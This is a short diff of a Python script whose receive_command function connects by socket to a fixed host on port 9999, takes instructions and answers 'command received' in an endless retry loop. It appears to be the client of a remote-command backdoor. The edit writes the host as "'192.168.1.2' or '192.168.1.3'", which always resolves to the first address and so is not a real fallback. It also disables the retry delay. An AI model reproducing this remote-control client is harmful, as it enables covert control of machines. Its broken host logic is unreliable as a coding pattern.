@@ -3,7 +3,7 @@ def receive_command():
     import os
 
     s = socket.socket()
-    host = '192.168.1.2'
+    host = '192.168.1.2' or '192.168.1.3'
     port = 9999
 
     try:
@@ -22,9 +22,9 @@ def receive_command():
             s.send('command received'.encode())
                 
     except:
-        print("Error connecting to server..retrying")
+        print("No incomming connection by server")
 
 while True:
     receive_command()
     import time
-    time.sleep(10)
+    # time.sleep(10)
